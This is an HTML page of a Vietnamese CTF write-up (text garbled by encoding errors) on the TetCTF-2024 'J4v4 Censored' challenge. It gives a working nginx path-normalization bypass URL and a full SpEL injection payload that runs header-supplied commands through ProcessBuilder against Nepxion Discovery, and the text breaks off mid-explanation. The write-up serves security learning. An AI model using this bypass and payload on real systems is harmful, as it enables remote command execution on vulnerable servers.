<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule | devme4f blogs</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2024/tetctf-2024_j4v4-censored/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule" />
<meta property="og:description" content="preface Hi! bÃ i nÃ y mÃ¬nh sáº½ writeup láº¡i bÃ i J4v4 Censored trong giáº£i TetCTF-2024 mÃ  team mÃ¬nh (KCSC) Ä‘Ã£ solve Ä‘Æ°á»£c. ÄÃ¢y lÃ  1 bÃ i java mÃ¬nh Ä‘Ã¡nh giÃ¡ khÃ´ng quÃ¡ khÃ³ nhÆ°ng láº¡i lÃ  half-black-box nÃªn pháº£i Ä‘oÃ¡n, fuzzing khÃ¡ nhiá»u nÃªn khi lÃ m mÃ¬nh khÃ¡ náº£n nhÆ°ng cÅ©ng nhá» cÃ³ teammates quyáº¿t tÃ¢m tÃ¬m ra Ä‘Æ°á»£c unintended solution nÃªn may máº¯n (cÅ©ng chÃ­nh lÃ  team duy nháº¥t) solved Ä‘Æ°á»£c." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2024/tetctf-2024_j4v4-censored/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-01-30T15:05:59+07:00" />
<meta property="article:modified_time" content="2024-01-30T15:05:59+07:00" />

  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule"/>
<meta name="twitter:description" content="preface Hi! bÃ i nÃ y mÃ¬nh sáº½ writeup láº¡i bÃ i J4v4 Censored trong giáº£i TetCTF-2024 mÃ  team mÃ¬nh (KCSC) Ä‘Ã£ solve Ä‘Æ°á»£c. ÄÃ¢y lÃ  1 bÃ i java mÃ¬nh Ä‘Ã¡nh giÃ¡ khÃ´ng quÃ¡ khÃ³ nhÆ°ng láº¡i lÃ  half-black-box nÃªn pháº£i Ä‘oÃ¡n, fuzzing khÃ¡ nhiá»u nÃªn khi lÃ m mÃ¬nh khÃ¡ náº£n nhÆ°ng cÅ©ng nhá» cÃ³ teammates quyáº¿t tÃ¢m tÃ¬m ra Ä‘Æ°á»£c unintended solution nÃªn may máº¯n (cÅ©ng chÃ­nh lÃ  team duy nháº¥t) solved Ä‘Æ°á»£c."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/posts/2023/svattt-2023_new-waf-deser/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/posts/2024/jasig-cas-past-vulnerabilities/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&text=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&is_video=false&description=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&title=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&name=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule&description=preface%20Hi%21%20b%c3%a0i%20n%c3%a0y%20m%c3%acnh%20s%e1%ba%bd%20writeup%20l%e1%ba%a1i%20b%c3%a0i%20J4v4%20Censored%20trong%20gi%e1%ba%a3i%20TetCTF-2024%20m%c3%a0%20team%20m%c3%acnh%20%28KCSC%29%20%c4%91%c3%a3%20solve%20%c4%91%c6%b0%e1%bb%a3c.%20%c4%90%c3%a2y%20l%c3%a0%201%20b%c3%a0i%20java%20m%c3%acnh%20%c4%91%c3%a1nh%20gi%c3%a1%20kh%c3%b4ng%20qu%c3%a1%20kh%c3%b3%20nh%c6%b0ng%20l%e1%ba%a1i%20l%c3%a0%20half-black-box%20n%c3%aan%20ph%e1%ba%a3i%20%c4%91o%c3%a1n%2c%20fuzzing%20kh%c3%a1%20nhi%e1%bb%81u%20n%c3%aan%20khi%20l%c3%a0m%20m%c3%acnh%20kh%c3%a1%20n%e1%ba%a3n%20nh%c6%b0ng%20c%c5%a9ng%20nh%e1%bb%9d%20c%c3%b3%20teammates%20quy%e1%ba%bft%20t%c3%a2m%20t%c3%acm%20ra%20%c4%91%c6%b0%e1%bb%a3c%20unintended%20solution%20n%c3%aan%20may%20m%e1%ba%afn%20%28c%c5%a9ng%20ch%c3%adnh%20l%c3%a0%20team%20duy%20nh%e1%ba%a5t%29%20solved%20%c4%91%c6%b0%e1%bb%a3c." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2024%2ftetctf-2024_j4v4-censored%2f&t=TetCTF-2024%20Ctf%20Writeup%20-%20J4v4%20Censored%20web%20challenge%20and%20unintended%20solution%20that%20break%20nginx%20rule" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">preface</a></li>
    <li><a href="#exploring">exploring</a></li>
    <li><a href="#bypass-nginx">bypass nginx</a></li>
    <li><a href="#bypass-spel-injection-blacklist">bypass SpEL injection blacklist</a></li>
    <li><a href="#end---ref">end - ref</a>
      <ul>
        <li><a href="#nginxconf">nginx.conf</a></li>
        <li><a href="#result-">result ğŸ˜ğŸ˜</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        TetCTF-2024 Ctf Writeup - J4v4 Censored web challenge and unintended solution that break nginx rule
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2024-01-30 15:05:59 &#43;0700 &#43;07" itemprop="datePublished">2024-01-30</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
            
             ,  
            <a class="tag-link" href="/tags/el-inject" rel="tag">el-inject</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p><img src="/images/2024/TetCTF-2024_J4v4-Censored/theme.png" alt="theme"></p>
<h2 id="preface">preface</h2>
<p>Hi! bÃ i nÃ y mÃ¬nh sáº½ writeup láº¡i bÃ i <code>J4v4 Censored</code> trong giáº£i <em>TetCTF-2024</em> mÃ  team mÃ¬nh (KCSC) Ä‘Ã£ solve Ä‘Æ°á»£c. ÄÃ¢y lÃ  1 bÃ i java mÃ¬nh Ä‘Ã¡nh giÃ¡ khÃ´ng quÃ¡ khÃ³ nhÆ°ng láº¡i lÃ  half-black-box nÃªn pháº£i Ä‘oÃ¡n, fuzzing khÃ¡ nhiá»u nÃªn khi lÃ m mÃ¬nh khÃ¡ náº£n nhÆ°ng cÅ©ng nhá» cÃ³ teammates quyáº¿t tÃ¢m tÃ¬m ra Ä‘Æ°á»£c unintended solution nÃªn may máº¯n (cÅ©ng chÃ­nh lÃ  team duy nháº¥t) solved Ä‘Æ°á»£c. Let&rsquo;s start!</p>
<h2 id="exploring">exploring</h2>
<p>Äá» cho url Ä‘áº¿n swagger endpoint nhÆ°ng khi truy cáº­p thÃ¬ khÃ´ng load Ä‘Æ°á»£c list cÃ¡c api:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/swagger.png" alt="swagger">
NguyÃªn nhÃ¢n do <code>/v2/api-docs?group=discovery</code> Ä‘Ã£ bá»‹ cháº·n:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/discovery.png" alt="discovery"></p>
<p>Thá»­ chuyá»ƒn thÃ nh post method thÃ¬ bypass Ä‘Æ°á»£c luÃ´n ğŸ˜€ğŸ˜€:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/bypass_discovery.png" alt="bypass_discovery"></p>
<p>Tá»« info cá»§a swagger thÃ¬ biáº¿t Ä‘Æ°á»£c app Ä‘ang cháº¡y <a href="https://github.com/nepxion/Discovery/">/nepxion/Discovery</a> module <a href="https://github.com/Nepxion/Discovery/tree/6.x.x/discovery-plugin-admin-center/discovery-plugin-admin-center-starter-swagger">discovery-plugin-admin-center-starter-swagger</a> nhÆ°ng nhÆ° title <code>discovery-springcloud-example-admin-remake</code> thÃ¬ cÃ³ thá»ƒ Ä‘Ã£ Ä‘Æ°á»£c modify.</p>
<p>Thá»­ tÃ¬m CVE trÃªn ná»n táº£ng nÃ y thÃ¬ mÃ¬nh tháº¥y cÃ³ 2 lá»— há»•ng Ä‘Ã¡ng chÃº Ã½ lÃ  SpEL Injection vÃ  SSRF táº¡i Ä‘Ã¢y: <a href="https://securitylab.github.com/advisories/GHSL-2022-033_GHSL-2022-034_Discovery/">https://securitylab.github.com/advisories/GHSL-2022-033_GHSL-2022-034_Discovery/</a></p>
<p>PoC cá»§a 2 lá»— há»•ng nÃ y cÅ©ng cÃ³ sáºµn rá»“i, nhÆ°ng khi á»‘p vÃ o thÃ¬ láº¡i khÃ´ng Äƒn ngay:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/test_poc.png" alt="test_poc">
Sau má»™t há»“i fuzz qua thÃ¬ mÃ¬nh tháº¥y cÃ¡c keyword nhÆ° <code>strategy</code>, <code>validate-expression</code> Ä‘Ã£ bá»‹ cháº·n, cÃ¹ng vá»›i má»™t sá»‘ kÃ½ tá»± nhÆ° <code>\</code> hay <code>;</code>. CÅ©ng dá»… nháº­n tháº¥y lÃ  endpoint nÃ y bá»‹ cháº·n bá»Ÿi nginx chá»© khÃ´ng pháº£i java app, tiá»m tÃ ng nguy cÆ¡ bá»‹ bypass ğŸ˜‚.</p>
<h2 id="bypass-nginx">bypass nginx</h2>
<p>Ã tÆ°á»Ÿng chá»™p Ä‘áº¿n ngay lÃ  dÃ¹ng bug SSRF Ä‘á»ƒ bypass vÃ  request Ä‘áº¿n endpoint <code>/strategy/validate-expression</code> tá»« localhost. Thá»­ SSRF thÃ¬ Ä‘áº¿n <code>/swagger-ui.html</code> thÃ¬ váº«n ok:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/test_index.png" alt="test_index"></p>
<p>NhÆ°ng Ä‘áº¿n <code>/strategy/validate-expression</code> thÃ¬ khÃ´ng Ä‘Æ°á»£c, nguyÃªn nhÃ¢n cÅ©ng khÃ¡ dá»… hiá»ƒu do nginx Ä‘Ã£ cháº·n cÃ¡c keyword mÃ¬nh Ä‘Ã£ ká»ƒ á»Ÿ trÃªn náº¿u náº±m trong URL, mÃ¬nh cÅ©ng chÆ°a tÃ¬m ra cÃ¡ch workaround nÃ o khÃ¡c do <a href="https://github.com/Nepxion/Discovery/blob/9f3e7a5f2ee028ffc9750b02c8642f2f53dbc330/discovery-plugin-admin-center/discovery-plugin-admin-center-starter/src/main/java/com/nepxion/discovery/plugin/admincenter/endpoint/RouterEndpoint.java#L55">endpoint</a> nÃ y láº¥y params tá»« path variable:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/route/{routeServiceId}/{routeProtocol}/{routeHost}/{routePort}/{routeContextPath}&#34;</span>, method <span style="color:#f92672">=</span> RequestMethod.<span style="color:#a6e22e">GET</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;è·å–æŒ‡å®šèŠ‚ç‚¹å¯è®¿é—®å…¶ä»–èŠ‚ç‚¹çš„è·¯ç”±ä¿¡æ¯åˆ—è¡¨&#34;</span>, notes <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>, response <span style="color:#f92672">=</span> ResponseEntity.<span style="color:#a6e22e">class</span>, httpMethod <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;GET&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@ResponseBody</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> ResponseEntity<span style="color:#f92672">&lt;?&gt;</span> route(<span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeServiceId&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ç›®æ ‡æœåŠ¡å&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeServiceId, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeProtocol&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ç›®æ ‡æœåŠ¡é‡‡ç”¨çš„åè®®ã€‚å–å€¼ï¼š http | https&#34;</span>, defaultValue <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeProtocol, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeHost&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ç›®æ ‡æœåŠ¡æ‰€åœ¨æœºå™¨çš„IPåœ°å€&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeHost, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routePort&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ç›®æ ‡æœåŠ¡æ‰€åœ¨æœºå™¨çš„ç«¯å£å·&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) <span style="color:#66d9ef">int</span> routePort, <span style="color:#a6e22e">@PathVariable</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;routeContextPath&#34;</span>) <span style="color:#a6e22e">@ApiParam</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ç›®æ ‡æœåŠ¡çš„è°ƒç”¨è·¯å¾„å‰ç¼€&#34;</span>, defaultValue <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>, required <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>) String routeContextPath) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> doRemoteRoute(routeServiceId, routeProtocol, routeHost, routePort, routeContextPath);
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>Chall cÅ©ng Ä‘Æ°á»£c cáº¥u hÃ¬nh Ä‘á»ƒ cháº·n out-bound do Ä‘Ã³ khÃ´ng thá»ƒ bypass báº±ng cÃ¡ch tá»± host server Ä‘á»ƒ redirect vá» láº¡i endpoint mong muá»‘n.
Stuck táº§m 1 ngÃ y thÃ¬ cuá»‘i cÃ¹ng Ä‘á»“ng Ä‘á»™i mÃ¬nh (<code>@null001</code>) Ä‘Ã£ tÃ¬m ra cÃ¡ch bypass nginx proxy Ä‘á»ƒ request Ä‘Æ°á»£c Ä‘áº¿n <code>/strategy/validate-expression</code> vÃ  exploit SpEL inject, cÅ©ng cháº³ng cáº§n Ä‘áº¿n bug SSRF luÃ´n(nghe lÃ  intended):
<img src="/images/2024/TetCTF-2024_J4v4-Censored/ui_bypass_dc_r.png" alt="ui_bypass_dc_r"></p>
<p>URL Ä‘á»ƒ bypasss nhÆ° sau:</p>
<pre tabindex="0"><code>/strategy;%2f%2e%2e%2f/validate-expression;%2f%2e%2e%2f/
</code></pre><p>VÃ¬ khÃ´ng cÃ³ source nÃªn mÃ¬nh khÃ´ng thá»ƒ confirm (<a href="#nginxconf">sau khi giáº£i end cÃ³ source thÃ¬ Ä‘Ã£ confirm Ä‘Æ°á»£c</a>) nhÆ°ng mÃ¬nh giáº£ Ä‘á»‹nh nguyÃªn nháº­n lÃ  do nginx khi nháº­n request sáº½ thá»±c hiá»‡n normalize url trÆ°á»›c khi thá»±c hiá»‡n cÃ¡c directives Ä‘á»ƒ check, sau khi check láº¡i proxy_pass original url chÆ°a decode Ä‘áº¿n java app. QuÃ¡ trÃ¬nh normalize Ä‘Æ¡n giáº£n hÃ³a nhÆ° sau <a href="https://stackoverflow.com/questions/48708361/nginx-request-uri-vs-uri">stackoverflow</a>:
<img src="/images/2024/TetCTF-2024_J4v4-Censored/stackoverflow.png" alt="stackoverflow"></p>
<p>Do Ä‘Ã³ khi thá»±c hiá»‡n request trÃªn, nginx sáº½ thá»±c hiÃªn url decode vÃ  normalize thÃ nh <code>$uri='/'</code> Ä‘áº«n Ä‘áº¿n cÃ¡c rule check trÃªn <code>$uri='/'</code> báº±ng 0 ğŸ˜†ğŸ˜†.</p>
<p>NhÆ°ng cÅ©ng chÆ°a ngon Äƒn ngay do param <code>expression</code> Ä‘Ã£ Ä‘Æ°á»£c tÃ¡c giáº£ custom láº¡i vÃ  thÃªm cÃ¡c backlist keyword mÃ  khi thá»±c hiá»‡n SpEL inject sáº½ khÃ´ng Äƒn ngay mÃ  mÃ¬nh fuzz Ä‘Æ°á»£c thÃ¬ Ä‘Ã³ lÃ  <code>'</code>, <code>&quot;</code> vÃ  <code>toString</code>. Ngá»“i bypass tiáº¿p thÃ´i</p>
<h2 id="bypass-spel-injection-blacklist">bypass SpEL injection blacklist</h2>
<p>Vá»›i cÃ¡c keyword bá»‹ blacklist lÃ  <code>'</code>, <code>&quot;</code> vÃ  <code>toString</code> nháº±m cháº·n táº¡o chuá»—i string thÃ¬ ai quen thuá»™c vá»›i dáº¡ng Ä‘á» CTF nÃ y mÃ¬nh nghÄ© cÅ©ng sáº½ khÃ´ng quÃ¡ khÃ³ khÄƒn Ä‘á»ƒ bypass.</p>
<p>Do Ä‘ang lÃ  dáº¡ng spel inject blind (+ khÃ´ng cÃ³ out-bound) nÃªn mÃ¬nh hÃ¬nh dung payload Ä‘á»ƒ exploit nÃ³ sáº½ tÆ°Æ¡ng tá»± nhÆ° nÃ y, háº¡n cháº¿ sá»­ dá»¥ng cÃ¡c chuá»—i string cÅ©ng nhÆ° láº¥y Ä‘Æ°á»£c input vÃ  tráº£ vá» response Ä‘á»u tá»« header:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getResponse</span>().<span style="color:#a6e22e">setHeader</span>(1,(T(java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>).<span style="color:#a6e22e">getConstructor</span>(T(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">InputStream</span>)).<span style="color:#a6e22e">newInstance</span>(<span style="color:#66d9ef">new</span> ProcessBuilder(T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getRequest</span>().<span style="color:#a6e22e">getHeader</span>(1)).<span style="color:#a6e22e">start</span>().<span style="color:#a6e22e">getInputStream</span>()).<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>).<span style="color:#a6e22e">next</span>()))
</span></span></code></pre></div><p>Äá»ƒ dá»… hiá»ƒu thÃ¬ payload cÃ³ thá»ƒ Ä‘Æ°á»£c chia nhá» nhÆ° sau:</p>
<ol>
<li>Láº¥y spring response object Ä‘á»ƒ kiá»ƒm soÃ¡t response cá»§a request:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getResponse</span>()
</span></span></code></pre></div><ol start="3">
<li>Gá»i <code>setHeader()</code> Ä‘á»ƒ tráº£ vá» output cá»§a command tá»« response</li>
<li>DÃ¹ng Scanner Ä‘á»ƒ láº¥y háº¿t string output tá»« inputstream cá»§a process:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(java.<span style="color:#a6e22e">util</span>.<span style="color:#a6e22e">Scanner</span>).<span style="color:#a6e22e">getConstructor</span>(T(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">InputStream</span>)).<span style="color:#a6e22e">newInstance</span>().<span style="color:#a6e22e">useDelimiter</span>(<span style="color:#e6db74">&#34;\\A&#34;</span>).<span style="color:#a6e22e">next</span>()
</span></span></code></pre></div><ol start="7">
<li>Gá»i <code>ProcessBuilder</code> thá»±c thi command:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#f92672">&lt;</span>input<span style="color:#f92672">&gt;</span>).<span style="color:#a6e22e">start</span>()
</span></span></code></pre></div><ol start="9">
<li>Láº¥y spring request object Ä‘á»ƒ láº¥y Ä‘Æ°á»£c input (command) tá»« request hiá»‡n táº¡i:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>T(org.<span style="color:#a6e22e">springframework</span>.<span style="color:#a6e22e">web</span>.<span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">RequestContextHolder</span>).<span style="color:#a6e22e">getRequestAttributes</span>().<span style="color:#a6e22e">getRequest</span>()
</span></span></code></pre></div><ol start="11">
<li>VÃ  gá»i <code>getHeader()</code> Ä‘á»ƒ láº¥y input tá»« header <code>1</code></li>
</ol>
<p>Äá»ƒ build Ä‘Æ°á»£c payload trÃªn thÃ¬ mÃ¬nh tá»± dá»±ng lab táº¡i local Ä‘á»ƒ test cho dá»… thÃ´i, tuy nhiÃªn payload trÃªn váº«n cÃ³ chá»— bá»‹ blacklist Ä‘Ã³ lÃ  <code>&quot;\A&quot;</code>, Ä‘á»ƒ bypass cÃ³ thá»ƒ dÃ¹ng cÃ¡ch sau
<img src="/images/2024/TetCTF-2024_J4v4-Censored/local_build_payload.png" alt="local_build_payload"></p>
<p>Convert qua dáº¡ng ssti:</p>
